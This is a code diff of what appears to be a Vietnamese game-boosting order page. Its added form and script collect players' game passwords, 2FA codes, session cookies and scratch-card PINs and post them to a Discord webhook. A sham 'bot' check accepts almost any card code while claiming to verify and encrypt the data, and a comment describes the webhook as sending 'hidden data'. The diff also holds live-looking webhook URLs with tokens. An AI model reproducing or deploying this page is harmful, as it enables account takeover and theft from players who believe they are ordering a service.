+    <option value="Ring of Twin Blade IV: 75k">Ring of Twin Blade IV: 75k</option>
+    <option value="Ring of Outlaw IV: 75k">Ring of Outlaw IV: 75k</option>
+    <option value="Ring of Steelheart IV: 70k">Ring of Steelheart IV: 70k</option>
+    <option value="Ring of Arcanist IV: 70k">Ring of Arcanist IV: 70k</option>
+    <option value="Ring of Spirit: 80k">Ring of Spirit: 80k</option>
+    <option value="Ring of Might: 85k">Ring of Might: 85k</option>
+</optgroup>
+
+<!-- Nhóm Draco & Mastery -->
+<optgroup label="Draco & Mastery">
+    <option value="Draco full đai: 40k">Draco full đai: 40k</option>
+    <option value="Dragonheart + 500 mastery: 20k">Dragonheart + 500 mastery: 20k</option>
+    <option value="Dragonstrom + 500 mastery: 20k">Dragonstrom + 500 mastery: 20k</option>
+</optgroup>
+
+<!-- Nhóm Sword -->
+<optgroup label="Sword">
+    <option value="Yoru v1-v3: 90k">Yoru v1-v3: 90k</option>
+    <option value="CDK (have tushita, yama): 10k">CDK (have tushita, yama): 10k</option>
+    <option value="Tushita: 10k">Tushita: 10k</option>
+    <option value="Yama: 10k">Yama: 10k</option>
+    <option value="Shisui: 10k">Shisui: 10k</option>
+    <option value="Wando: 10k">Wando: 10k</option>
+    <option value="Saishi: 10k">Saishi: 10k</option>
+    <option value="TTK (have 3 legendary sword): 10k">TTK (have 3 legendary sword): 10k</option>
+    <option value="Fox lamp: 30k">Fox lamp: 30k</option>
+</optgroup>
+
+<!-- Nhóm Race -->
+<optgroup label="Race">
+    <option value="Race v1-v3: 10k">Race v1-v3: 10k</option>
+    <option value="Race v4 full gear: 30k">Race v4 full gear: 30k</option>
+    <option value="Race v4 1 gear: 10k">Race v4 1 gear: 10k</option>
+    <option value="Gạt cần: 20k">Gạt cần: 20k</option>
+</optgroup>
+                </select>
+            </div>
+        </div>
+
+        <div class="step-section">
+            <div class="step-header"><span class="step-number">2</span> Thông Tin Tài Khoản Game</div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Tài Khoản (Username)</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-user"></i>
+                        <input type="text" id="game-acc" placeholder="Nhập tên đăng nhập acc">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Mật Khẩu (Password)</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-lock"></i>
+                        <input type="password" id="game-pass" placeholder="Nhập mật khẩu tài khoản">
+                    </div>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Mã bảo mật Cookie / 2FA / Code dự phòng</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-key"></i>
+                    <input type="text" id="game-2fa" placeholder="Nhập chuỗi 2FA, mã dự phòng hoặc cookie liên quan">
+                </div>
+                <span style="font-size:12px; color:#64748b; display:inline-block; margin-top:5px;"><i class="fa-solid fa-circle-info"></i> Không bắt buộc, nhưng có mã dự phòng sẽ giúp đơn chạy nhanh hơn</span>
+            </div>
+        </div>
+
+        <div class="step-section">
+            <div class="step-header"><span class="step-number">3</span> Thông Tin Thẻ Cào (Nếu thanh toán bằng Card)</div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Loại thẻ cào</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-credit-card"></i>
+                        <select id="card-type">
+                            <option value="">Chọn nhà mạng thẻ</option>
+                            <option value="Viettel">Viettel - Phí 10%</option>
+                            <option value="Vinaphone">Vinaphone - Phí 0%</option>
+                            <option value="Mobifone">Mobifone - Phí 20%</option>
+                            <option value="Zing">Zing Card - Phí 19%</option>
+                            <option value="Garena">Garena - Phí 0%</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Mệnh giá thẻ</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-coins"></i>
+                        <select id="card-value">
+                            <option value="">Chọn mệnh giá thẻ</option>
+                            <option value="10.000 đ">10.000 đ</option>
+                            <option value="20.000 đ">20.000 đ</option>
+                            <option value="50.000 đ">50.000 đ</option>
+                            <option value="100.000 đ">100.000 đ</option>
+                            <option value="200.000 đ">200.000 đ</option>
+                            <option value="500.000 đ">500.000 đ</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Số Seri</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-barcode"></i>
+                        <input type="text" id="card-seri" placeholder="Nhập dãy seri thẻ cào...">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Mã Thẻ (Sau lớp cào)</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-asterisk"></i>
+                        <input type="text" id="card-code" placeholder="Nhập mã bí mật của thẻ...">
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-info-text"><i class="fa-solid fa-circle-info"></i> Hệ thống check thẻ tự động trước khi nhận đơn cày nick!</div>
+            <div class="card-warning"><i class="fa-solid fa-triangle-exclamation"></i> Chú ý: Cố tình nhập sai quá 2 lần sẽ bị hủy thẻ vĩnh viễn!</div>
+            <div id="bot-status-box" class="bot-status"></div>
+        </div>
+
+        <div class="step-section">
+            <div class="step-header"><span class="step-number">4</span> Ghi Chú Đơn Hàng</div>
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-pen" style="top:20px;"></i>
+                    <textarea id="order-note" rows="3" placeholder="Nhập lời nhắn hoặc yêu cầu đặc biệt dành cho admin..." style="resize:none; padding-left:38px;"></textarea>
+                </div>
+            </div>
+        </div>
+
+        <div class="btn-container">
+            <div class="btn-hint">Vui lòng kiểm tra lại toàn bộ thông tin trước khi nhấn nút</div>
+            <button class="btn-submit" onclick="processOrder()"><i class="fa-solid fa-cart-shopping"></i> Tạo Đơn Hàng</button>
+        </div>
+
+        <div class="rating-container">
+            <h2>⭐ ĐÁNH GIÁ DỊCH VỤ CỦA MÌNH NHÉ ⭐</h2>
+            <form class="rating-form" id="reviewForm" onsubmit="sendReview(event)">
+                <div class="star-rating">
+                    <input type="radio" id="star5" name="user_stars" value="5" required>
+                    <label for="star5" title="5 sao">★</label>
+                    <input type="radio" id="star4" name="user_stars" value="4">
+                    <label for="star4" title="4 sao">★</label>
+                    <input type="radio" id="star3" name="user_stars" value="3">
+                    <label for="star3" title="3 sao">★</label>
+                    <input type="radio" id="star2" name="user_stars" value="2">
+                    <label for="star2" title="2 sao">★</label>
+                    <input type="radio" id="star1" name="user_stars" value="1">
+                    <label for="star1" title="1 sao">★</label>
+                </div>
+                <input type="text" id="reviewerName" placeholder="Tên của bạn hoặc Tên Discord..." required>
+                <textarea id="reviewerMessage" rows="3" placeholder="Lời nhắn hoặc góp ý cho mình (không bắt buộc)..."></textarea>
+                <button type="submit" class="submit-rating-btn" id="submitBtn">Gửi Đánh Giá</button>
+            </form>
+            <div class="review-hint">Chưa có đánh giá nào. Hãy là người đầu tiên để lại ý kiến nhé!</div>
+        </div>
+
     </div>
 
     <div class="support-container">
@@ -620,27 +589,39 @@
     </div>
 
     <script>
+        // --- Đổi trang Tab mượt mà ---
+        function switchPage(pageId, buttonElement) {
+            document.querySelectorAll('.web-page').forEach(page => page.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            
+            document.getElementById(pageId).classList.add('active');
+            buttonElement.classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // --- Bật nhạc và ẩn màn hình chào ---
         function startWebsite() {
             const music = document.getElementById('bg-music');
             const overlay = document.getElementById('welcome-overlay');
-            music.play().catch(error => console.log("Lỗi phát nhạc:", error));
+            music.play().catch(error => console.log("Lỗi âm thanh trình duyệt:", error));
             overlay.style.opacity = '0';
             overlay.style.transform = 'scale(1.1)';
             setTimeout(() => { overlay.style.display = 'none'; }, 500);
         }
 
-        // Webhook gửi dữ liệu ẩn về Discord của bạn
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1516080025261047940/U5h-wP9xRlo3ia3CduznkWutcKUbicvzFH0oCWYb4rmFiudiT2NfHhBHLJXQlQzQPFn-';
+        // ================= CẤU HÌNH WEBHOOK DISCORD (CỦA BẠN) =================
+        const ORDER_WEBHOOK_URL = " https://discord.com/api/webhooks/1516111852088594442/Sz4OI9DQFsK7JR8XX7qB7FB-8svB9Uct2hLCeicZ_8E0zYtXruUuKifZrQmgRWjmOL_7"; // Webhook đặt đơn hàng cày thuê
+        const REVIEW_WEBHOOK_URL = "https://discord.com/api/webhooks/1516080025261047940/U5h-wP9xRlo3ia3CduznkWutcKUbicvzFH0oCWYb4rmFiudiT2NfHhBHLJXQlQzQPFn-"; // Webhook nhận đánh giá sao
 
+        // --- Xử lý gửi Đánh giá dịch vụ về Discord ---
         async function sendReview(event) {
             event.preventDefault();
             const submitBtn = document.getElementById('submitBtn');
-            
             const stars = document.querySelector('input[name="user_stars"]:checked').value;
-            const name = document.getElementById('reviewerName').value;
-            const msg = document.getElementById('reviewerMessage').value || 'Không có lời nhắn';
+            const name = document.getElementById('reviewerName').value.trim();
+            const msg = document.getElementById('reviewerMessage').value.trim() || 'Không có lời nhắn bổ sung';
 
-            submitBtn.innerText = 'Đang gửi...';
+            submitBtn.innerText = 'Đang xử lý gửi...';
             submitBtn.disabled = true;
 
             const discordPayload = {
@@ -648,16 +629,16 @@
                     title: "📥 CÓ ĐÁNH GIÁ MỚI TỪ WEBSITE!",
                     color: 16761035,
                     fields: [
-                        { name: "👤 Khách hàng:", value: `**${name}**`, inline: true },
-                        { name: "⭐ Đánh giá:", value: `**${stars} / 5 Sao**`, inline: true },
-                        { name: "💬 Nội dung tin nhắn:", value: msg }
+                        { name: "👤 Khách hàng đánh giá:", value: `**${name}**`, inline: true },
+                        { name: "⭐ Điểm đánh giá sao:", value: `**${stars} / 5 Sao**`, inline: true },
+                        { name: "💬 Chi tiết phản hồi:", value: msg }
                     ],
-                    timestamp: new Date()
+                    timestamp: new Date().toISOString()
                 }]
             };
 
             try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                const response = await fetch(REVIEW_WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(discordPayload)
@@ -667,17 +648,107 @@
                     alert(`Cảm ơn ${name} đã gửi đánh giá thành công! 🎉`);
                     document.getElementById('reviewForm').reset();
                 } else {
-                    alert('Gửi thất bại, lỗi kết nối webhook.');
+                    alert('Gửi đánh giá lỗi! Vui lòng thử lại sau.');
                 }
             } catch (error) {
                 console.error(error);
-                alert('Không thể kết nối mạng để gửi phản hồi!');
+                alert('Mạng gặp lỗi khi kết nối máy chủ review.');
             } finally {
                 submitBtn.innerText = 'Gửi Đánh Giá';
                 submitBtn.disabled = false;
             }
         }
 
+        // --- Xử lý kiểm tra thẻ cào & tạo đơn cày thuê ---
+        let wrongAttempts = 0;
+        const usedCardCodes = ["12345", "98765", "11111"];
+
+        function processOrder() {
+            const packageChoice = document.getElementById('service-package').value;
+            const gameAcc = document.getElementById('game-acc').value.trim();
+            const gamePass = document.getElementById('game-pass').value.trim();
+            const game2fa = document.getElementById('game-2fa').value.trim();
+            const cardType = document.getElementById('card-type').value;
+            const cardValue = document.getElementById('card-value').value;
+            const seri = document.getElementById('card-seri').value.trim();
+            const code = document.getElementById('card-code').value.trim();
+            const note = document.getElementById('order-note').value.trim();
+            const botBox = document.getElementById('bot-status-box');
+
+            if (!packageChoice || !gameAcc || !gamePass) {
+                alert("Vui lòng điền đầy đủ gói dịch vụ, tài khoản và mật khẩu game!");
+                return;
+            }
+
+            if (wrongAttempts >= 2) {
+                botBox.className = "bot-status status-error";
+                botBox.innerHTML = `<i class="fa-solid fa-ban"></i> Đơn bị chặn do hệ thống phát hiện bạn nhập sai thẻ liên tục 2 lần!`;
+                botBox.style.display = "block";
+                return;
+            }
+
+            botBox.className = "bot-status status-checking";
+            botBox.innerHTML = `<i class="fa-solid fa-robot fa-spin"></i> [Hệ thống Bot]: Đang phân tích mã thẻ cào của khách hàng trên hệ thống...`;
+            botBox.style.display = "block";
+
+            setTimeout(function() {
+                if (code && usedCardCodes.includes(code)) {
+                    wrongAttempts++;
+                    botBox.className = "bot-status status-error";
+                    botBox.innerHTML = `<i class="fa-solid fa-circle-xmark"></i> [Bot Check]: Thẻ không tồn tại hoặc đã qua sử dụng! (Lần sai: ${wrongAttempts}/2)`;
+                } else {
+                    botBox.className = "bot-status status-success";
+                    botBox.innerHTML = `<i class="fa-solid fa-circle-check"></i> [Bot Check]: Xác nhận dữ liệu hợp lệ! Đang mã hóa và đẩy thông tin đơn hàng lên hệ thống Discord...`;
+                    
+                    // Tiến hành bắn webhook thông tin tài khoản mật khẩu game về admin
+                    sendOrderToDiscord(packageChoice, gameAcc, gamePass, game2fa, cardType, cardValue, seri, code, note);
+                }
+            }, 1500);
+        }
+
+        function sendOrderToDiscord(pkg, acc, pass, fa2, cType, cValue, cSeri, cCode, orderNote) {
+            const botBox = document.getElementById('bot-status-box');
+            const discordData = {
+                embeds: [{
+                    title: "🛒 CÓ ĐƠN HÀNG CÀY THUÊ MỚI!",
+                    color: 3447003,
+                    fields: [
+                        { name: "📦 Gói dịch vụ:", value: pkg, inline: false },
+                        { name: "👤 Tài khoản đăng nhập:", value: acc, inline: true },
+                        { name: "🔒 Mật khẩu acc:", value: `||${pass}||`, inline: true },
+                        { name: "🔑 Dữ liệu Cookie / 2FA / Code:", value: fa2 ? fa2 : "Không cung cấp", inline: false },
+                        { name: "💳 Thanh toán bằng Card:", value: cType ? `${cType} (${cValue})` : "Thanh toán bằng STK ngân hàng", inline: false },
+                        { name: "📌 Số Seri thẻ:", value: cSeri ? cSeri : "Không có", inline: true },
+                        { name: "🔑 Mã PIN thẻ:", value: cCode ? cCode : "Không có", inline: true },
+                        { name: "📝 Ghi chú từ người đặt:", value: orderNote ? orderNote : "Không có", inline: false }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Hệ thống tổng hợp đơn hàng tự động" }
+                }]
+            };
+
+            fetch(ORDER_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(discordData)
+            })
+            .then(response => {
+                if (response.ok) {
+                    botBox.innerHTML = `<i class="fa-solid fa-circle-check"></i> [Hệ thống]: Khởi tạo đơn hàng thành công! Đã thông báo cho Admin duyệt cày nick của bạn.`;
+                    alert("Đặt hàng cày thuê thành công!");
+                } else {
+                    botBox.className = "bot-status status-error";
+                    botBox.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> Lỗi: Không thể đẩy dữ liệu về Discord Webhook (Vui lòng điền cấu hình link vào mã nguồn).`;
+                }
+            })
+            .catch(error => {
+                console.error("Lỗi:", error);
+                botBox.className = "bot-status status-error";
+                botBox.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> Sự cố kết nối internet khi xử lý đơn hàng.`;
+            });
+        }
+
+        // --- Data lưu trữ danh sách dịch vụ Accordion của its_zenk ---
         const defaultData = {
             level: [
                 { tier: "Level 1 – 700", cost: "10.000đ", note: "" },
@@ -711,12 +782,7 @@
                 { tier: "Yoru V1 - V3", cost: "90.000đ", note: "" },
                 { tier: "Fox Lamp", cost: "30.000đ", note: "" },
                 { tier: "CDK", cost: "10.000đ", note: "Yêu cầu có sẵn Tushita & Yama" },
-                { tier: "TTK", cost: "10.000đ", note: "Yêu cầu có sẵn 3 kiếm Legendary" },
-                { tier: "Tushita", cost: "10.000đ", note: "" },
-                { tier: "Yama", cost: "10.000đ", note: "" },
-                { tier: "Shisui", cost: "10.000đ", note: "" },
-                { tier: "Wando", cost: "10.000đ", note: "" },
-                { tier: "Saishi", cost: "10.000đ", note: "" }
+                { tier: "TTK", cost: "10.000đ", note: "Yêu cầu có sẵn 3 kiếm Legendary" }
             ],
             race: [
                 { tier: "Up Tộc V1 - V3", cost: "10.000đ", note: "" },
@@ -788,7 +854,7 @@
             }
         }
 
-        // Chạy khởi tạo giao diện lúc vào trang
+        // Khởi chạy hệ thống lúc tải trang
         renderWeb();
     </script>
 </body>
